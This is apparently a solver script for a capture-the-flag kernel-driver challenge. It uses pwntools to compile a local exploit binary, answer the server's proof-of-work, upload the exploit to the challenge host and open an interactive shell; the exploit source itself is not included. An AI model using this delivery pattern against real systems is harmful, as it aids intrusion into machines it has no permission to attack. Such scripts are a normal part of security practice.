#!/usr/bin/env python3
import subprocess

from pwn import *
import gmpy2


def connect():
    return remote("baby-kit-driver.ctf.0ops.sjtu.cn", 20001)


def main():
    subprocess.check_call(["make", "pwnit"])
    with open("pwnit", "rb") as fp:
        exploit = fp.read()
    with connect() as tube:
        tube.recvuntil(b"Show me your computation:\n")
        challenge = tube.recvline()
        match = re.search(rb"2\^\(2\^(\d+)\) mod (\d+)", challenge)
        n, m = match.groups()
        n = int(n)
        m = int(m)
        answer = gmpy2.powmod(2, 2**n, m)
        tube.sendlineafter(b"Your answer: ", str(answer).encode())
        tube.sendlineafter(
            b"Size of your exp(no more than 1MB): ", str(len(exploit)).encode()
        )
        tube.sendafter(b"EXP File:", exploit)
        tube.interactive()


if __name__ == "__main__":
    main()
